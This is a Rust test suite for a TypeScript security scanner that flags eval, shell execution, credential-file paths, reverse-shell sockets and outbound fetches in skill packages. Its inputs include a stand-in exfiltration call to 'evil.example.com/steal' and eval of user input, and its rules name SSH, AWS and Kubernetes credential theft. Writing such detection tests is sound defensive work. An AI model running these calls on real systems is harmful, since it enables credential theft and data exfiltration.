use std::path::Path;

use oxidized_skills::config::Config;
use oxidized_skills::finding::Severity;
use oxidized_skills::scanners::typescript::TypeScriptScanner;
use oxidized_skills::scanners::Scanner;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn scan_fixture(fixture: &str) -> oxidized_skills::finding::ScanResult {
    let config = Config::default();
    let path = Path::new("tests/fixtures").join(fixture);
    TypeScriptScanner.scan(&path, &config)
}

/// Write a single-file skill directory into `dir` and scan it.
fn scan_ts_content(content: &str) -> oxidized_skills::finding::ScanResult {
    let dir = tempfile::tempdir().unwrap();
    let scripts = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts).unwrap();
    std::fs::write(scripts.join("index.ts"), content).unwrap();
    let config = Config::default();
    TypeScriptScanner.scan(dir.path(), &config)
}

// ---------------------------------------------------------------------------
// Availability
// ---------------------------------------------------------------------------

#[test]
fn typescript_scanner_is_always_available() {
    assert!(TypeScriptScanner.is_available());
}

// ---------------------------------------------------------------------------
// Clean skill — zero findings
// ---------------------------------------------------------------------------

#[test]
fn clean_skill_has_no_typescript_findings() {
    let result = scan_fixture("clean-ts-skill");
    assert!(!result.skipped);
    assert!(
        result.findings.is_empty(),
        "Expected no findings for clean-ts-skill, got: {:#?}",
        result.findings
    );
}

#[test]
fn clean_skill_counts_ts_files_scanned() {
    let result = scan_fixture("clean-ts-skill");
    assert!(
        result.files_scanned >= 1,
        "Expected at least one TS file to be scanned"
    );
}

// ---------------------------------------------------------------------------
// Directory with no TS files
// ---------------------------------------------------------------------------

#[test]
fn no_ts_files_yields_zero_files_scanned() {
    let dir = tempfile::tempdir().unwrap();
    // Write only a shell script — TypeScript scanner should ignore it.
    std::fs::write(dir.path().join("run.sh"), "#!/bin/bash\necho hi\n").unwrap();
    let config = Config::default();
    let result = TypeScriptScanner.scan(dir.path(), &config);
    assert_eq!(
        result.files_scanned, 0,
        "TypeScript scanner should ignore .sh files"
    );
    assert!(result.findings.is_empty());
}

// ---------------------------------------------------------------------------
// Category A: Arbitrary Code Execution
// ---------------------------------------------------------------------------

#[test]
fn eval_call_fires_cat_a1_error() {
    let result = scan_fixture("dirty-ts-skill");
    let findings: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-A1")
        .collect();
    assert!(
        !findings.is_empty(),
        "Expected typescript/CAT-A1 for eval() call"
    );
    assert_eq!(findings[0].severity, Severity::Error);
}

#[test]
fn new_function_fires_cat_a2_error() {
    let result = scan_fixture("dirty-ts-skill");
    let findings: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-A2")
        .collect();
    assert!(
        !findings.is_empty(),
        "Expected typescript/CAT-A2 for new Function()"
    );
    assert_eq!(findings[0].severity, Severity::Error);
}

#[test]
fn property_eval_no_false_positive() {
    // `obj.eval(x)` must NOT trigger CAT-A1 — it is a property access, not a
    // standalone eval call.
    let result = scan_ts_content(
        r#"
const obj = { eval: (x: string) => x };
const out = obj.eval("safe");
"#,
    );
    let a1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-A1")
        .collect();
    assert!(
        a1.is_empty(),
        "obj.eval() should not trigger CAT-A1; got findings: {a1:#?}"
    );
}

#[test]
fn eval_at_start_of_line_fires() {
    let result = scan_ts_content("eval(process.argv[2]);\n");
    let a1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-A1")
        .collect();
    assert!(!a1.is_empty(), "eval() at start of line must fire CAT-A1");
}

// ---------------------------------------------------------------------------
// Category B: Shell Execution
// ---------------------------------------------------------------------------

#[test]
fn child_process_require_fires_cat_b1_warning() {
    let result = scan_fixture("dirty-ts-skill");
    let findings: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-B1")
        .collect();
    assert!(
        !findings.is_empty(),
        "Expected typescript/CAT-B1 for child_process import"
    );
    assert_eq!(findings[0].severity, Severity::Warning);
}

#[test]
fn exec_sync_fires_cat_b2_warning() {
    let result = scan_fixture("dirty-ts-skill");
    let findings: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-B2")
        .collect();
    assert!(
        !findings.is_empty(),
        "Expected typescript/CAT-B2 for execSync() call"
    );
    assert_eq!(findings[0].severity, Severity::Warning);
}

#[test]
fn child_process_es_import_fires_cat_b1() {
    // ES module style: import { execSync } from 'child_process'
    let result = scan_ts_content("import { execSync } from 'child_process';\nexecSync('ls');\n");
    let b1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-B1")
        .collect();
    assert!(
        !b1.is_empty(),
        "ES import from 'child_process' must fire typescript/CAT-B1"
    );
}

// ---------------------------------------------------------------------------
// Category B: Shell Execution — CAT-B3 async variants
// ---------------------------------------------------------------------------

#[test]
fn exec_call_fires_cat_b3_info() {
    // exec() from child_process (async variant) must fire CAT-B3 at Info severity.
    let result =
        scan_ts_content("const { exec } = require('child_process');\nexec('ls -la', callback);\n");
    let b3: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-B3")
        .collect();
    assert!(!b3.is_empty(), "exec() call must fire typescript/CAT-B3");
    assert_eq!(b3[0].severity, Severity::Info);
}

#[test]
fn spawn_call_fires_cat_b3_info() {
    let result = scan_ts_content("spawn('git', ['status']);\n");
    let b3: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-B3")
        .collect();
    assert!(!b3.is_empty(), "spawn() call must fire typescript/CAT-B3");
    assert_eq!(b3[0].severity, Severity::Info);
}

#[test]
fn exec_file_call_fires_cat_b3_info() {
    let result = scan_ts_content("execFile('/usr/bin/git', ['log'], callback);\n");
    let b3: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-B3")
        .collect();
    assert!(
        !b3.is_empty(),
        "execFile() call must fire typescript/CAT-B3"
    );
}

#[test]
fn exec_sync_still_fires_cat_b2_warning() {
    // CAT-B2 (Warning) must still fire for execSync — adding B3 must not regress B2.
    let result = scan_ts_content("execSync('ls');\n");
    let b2: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-B2")
        .collect();
    assert!(
        !b2.is_empty(),
        "execSync() must still fire typescript/CAT-B2 (regression guard)"
    );
    assert_eq!(b2[0].severity, Severity::Warning);
}

#[test]
fn exec_with_suppress_is_skipped() {
    let result = scan_ts_content("exec('harmless'); // audit:ignore\n");
    let b3: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-B3")
        .collect();
    assert!(
        b3.is_empty(),
        "exec() with // audit:ignore must not produce CAT-B3"
    );
}

#[test]
fn regex_exec_method_no_cat_b3_false_positive() {
    // /regex/.exec(str) is a RegExp method call, NOT a child_process call.
    // The `.` before exec must suppress CAT-B3 — matches the clean-ts-skill fixture pattern.
    let result = scan_ts_content("const match = /v(\\d+\\.\\d+\\.\\d+)/.exec(text);\n");
    let b3: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-B3")
        .collect();
    assert!(
        b3.is_empty(),
        "/regex/.exec() must NOT trigger CAT-B3 — it is a RegExp method, not child_process"
    );
}

// ---------------------------------------------------------------------------
// Category C: Credential File Access
// ---------------------------------------------------------------------------

#[test]
fn ssh_key_path_fires_cat_c1_error() {
    let result = scan_fixture("dirty-ts-skill");
    let findings: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-C1")
        .collect();
    assert!(
        !findings.is_empty(),
        "Expected typescript/CAT-C1 for .ssh/id_rsa path"
    );
    assert_eq!(findings[0].severity, Severity::Error);
}

#[test]
fn aws_credentials_fires_cat_c2_error() {
    let result = scan_fixture("dirty-ts-skill");
    let findings: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-C2")
        .collect();
    assert!(
        !findings.is_empty(),
        "Expected typescript/CAT-C2 for .aws/credentials path"
    );
    assert_eq!(findings[0].severity, Severity::Error);
}

#[test]
fn kube_config_fires_cat_c3_error() {
    let result = scan_fixture("dirty-ts-skill");
    let findings: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-C3")
        .collect();
    assert!(
        !findings.is_empty(),
        "Expected typescript/CAT-C3 for .kube/config path"
    );
    assert_eq!(findings[0].severity, Severity::Error);
}

// ---------------------------------------------------------------------------
// Category D: Reverse Shell / Backdoors
// ---------------------------------------------------------------------------

#[test]
fn net_create_connection_fires_cat_d1_error() {
    let result = scan_fixture("dirty-ts-skill");
    let findings: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-D1")
        .collect();
    assert!(
        !findings.is_empty(),
        "Expected typescript/CAT-D1 for net.createConnection()"
    );
    assert_eq!(findings[0].severity, Severity::Error);
}

// ---------------------------------------------------------------------------
// Category H: Outbound Network
// ---------------------------------------------------------------------------

#[test]
fn outbound_fetch_fires_cat_h1_info() {
    let result = scan_fixture("dirty-ts-skill");
    let findings: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-H1")
        .collect();
    assert!(
        !findings.is_empty(),
        "Expected typescript/CAT-H1 for fetch() to non-allowlisted URL"
    );
    assert_eq!(findings[0].severity, Severity::Info);
}

#[test]
fn allowlisted_domain_suppresses_cat_h1() {
    // fetch() to an allowlisted domain must NOT produce a CAT-H1 finding.
    let dir = tempfile::tempdir().unwrap();
    let scripts = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts).unwrap();
    std::fs::write(
        scripts.join("client.ts"),
        "const res = fetch('https://github.com/api/data');\n",
    )
    .unwrap();

    let mut config = Config::default();
    config.allowlist.domains = vec!["github.com".to_string()];
    let result = TypeScriptScanner.scan(dir.path(), &config);

    let h1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-H1")
        .collect();
    assert!(
        h1.is_empty(),
        "fetch to allowlisted domain must not trigger CAT-H1; got: {h1:#?}"
    );
}

#[test]
fn non_allowlisted_domain_fires_cat_h1() {
    let result = scan_ts_content("const res = fetch('https://evil.example.com/steal');\n");
    let h1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-H1")
        .collect();
    assert!(
        !h1.is_empty(),
        "fetch to non-allowlisted domain must fire typescript/CAT-H1"
    );
}

#[test]
fn subdomain_of_allowlisted_domain_is_suppressed() {
    // api.github.com is a subdomain of github.com — must be allowlisted.
    let dir = tempfile::tempdir().unwrap();
    let scripts = dir.path().join("scripts");
    std::fs::create_dir_all(&scripts).unwrap();
    std::fs::write(
        scripts.join("api.ts"),
        "const res = fetch('https://api.github.com/repos/owner/repo');\n",
    )
    .unwrap();

    let mut config = Config::default();
    config.allowlist.domains = vec!["github.com".to_string()];
    let result = TypeScriptScanner.scan(dir.path(), &config);

    let h1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-H1")
        .collect();
    assert!(
        h1.is_empty(),
        "fetch to subdomain of allowlisted entry must not fire CAT-H1; got: {h1:#?}"
    );
}

// ---------------------------------------------------------------------------
// Suppression: inline markers
// ---------------------------------------------------------------------------

#[test]
fn inline_suppress_silences_finding() {
    // A line ending with `// audit:ignore` must not produce a finding even
    // when it matches a dangerous pattern.
    let result = scan_ts_content("eval(userInput); // audit:ignore\n");
    let a1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-A1")
        .collect();
    assert!(
        a1.is_empty(),
        "Line with // audit:ignore must not fire CAT-A1; got: {a1:#?}"
    );
}

#[test]
fn oxidized_skills_ignore_marker_silences_finding() {
    let result = scan_ts_content("eval(userInput); // oxidized-skills:ignore\n");
    let a1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-A1")
        .collect();
    assert!(
        a1.is_empty(),
        "Line with // oxidized-skills:ignore must not fire CAT-A1"
    );
}

// ---------------------------------------------------------------------------
// Suppression: comment lines
// ---------------------------------------------------------------------------

#[test]
fn comment_lines_are_not_scanned() {
    // A line that starts with `//` is a comment and must be skipped entirely.
    let result = scan_ts_content(
        "// eval('this is documentation, not code')\n// new Function('x', 'return x')\n",
    );
    assert!(
        result.findings.is_empty(),
        "Single-line comments must never produce findings; got: {:#?}",
        result.findings
    );
}

// ---------------------------------------------------------------------------
// Finding metadata quality
// ---------------------------------------------------------------------------

#[test]
fn finding_includes_line_number() {
    // The scanner must record the correct 1-based line number.
    let result = scan_ts_content("// safe line\neval(badInput);\n// another safe line\n");
    let a1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-A1")
        .collect();
    assert!(!a1.is_empty(), "Expected CAT-A1 finding");
    assert_eq!(
        a1[0].line,
        Some(2),
        "eval() is on line 2 — scanner must report that"
    );
}

#[test]
fn finding_includes_file_path() {
    let result = scan_ts_content("eval(bad);\n");
    let a1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-A1")
        .collect();
    assert!(!a1.is_empty());
    assert!(
        a1[0].file.is_some(),
        "Finding must include the source file path"
    );
}

#[test]
fn finding_includes_snippet() {
    let line = "eval(process.argv[2]);";
    let result = scan_ts_content(&format!("{line}\n"));
    let a1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-A1")
        .collect();
    assert!(!a1.is_empty());
    assert!(
        a1[0].snippet.is_some(),
        "Finding must include a code snippet"
    );
}

#[test]
fn finding_includes_remediation() {
    let result = scan_ts_content("eval(bad);\n");
    let a1: Vec<_> = result
        .findings
        .iter()
        .filter(|f| f.rule_id == "typescript/CAT-A1")
        .collect();
    assert!(!a1.is_empty());
    assert!(
        a1[0].remediation.is_some(),
        "Finding must include remediation guidance"
    );
}

// ---------------------------------------------------------------------------
// Rule catalogue
// ---------------------------------------------------------------------------

#[test]
fn rules_catalogue_is_non_empty() {
    let rules = oxidized_skills::scanners::typescript::rules();
    assert!(
        !rules.is_empty(),
        "TypeScript scanner must expose at least one rule"
    );
}

#[test]
fn rules_catalogue_covers_all_categories() {
    let rules = oxidized_skills::scanners::typescript::rules();
    let ids: Vec<&str> = rules.iter().map(|r| r.id).collect();

    for expected in &[
        "typescript/CAT-A1",
        "typescript/CAT-A2",
        "typescript/CAT-B1",
        "typescript/CAT-B2",
        "typescript/CAT-B3",
        "typescript/CAT-C1",
        "typescript/CAT-C2",
        "typescript/CAT-C3",
        "typescript/CAT-D1",
        "typescript/CAT-H1",
    ] {
        assert!(
            ids.contains(expected),
            "Rule catalogue is missing rule {expected}"
        );
    }
}

#[test]
fn scanner_config_toggle_disables_scanner() {
    // When typescript_patterns = false, is_scanner_enabled must return false.
    let mut config = Config::default();
    config.scanners.typescript_patterns = false;
    assert!(
        !config.is_scanner_enabled("typescript_patterns"),
        "typescript_patterns toggle must disable the scanner"
    );
}

#[test]
fn typescript_pattern_rule_count_matches_expected() {
    // Pins the exact number of TypeScript scanner rules as a regression guard.
    // If PATTERNS and PATTERN_SET drift out of sync the debug_assert_eq! in
    // scan() catches it, but this test also provides a visible count check.
    //
    // Expected: A1-A2 (2) + B1-B3 (3) + C1-C3 (3) + D1 (1) + H1 (1) = 10
    let rules = oxidized_skills::scanners::typescript::rules();
    assert_eq!(
        rules.len(),
        10,
        "TypeScript scanner has {} rules but expected 10 — update this count after adding/removing a pattern",
        rules.len()
    );
}
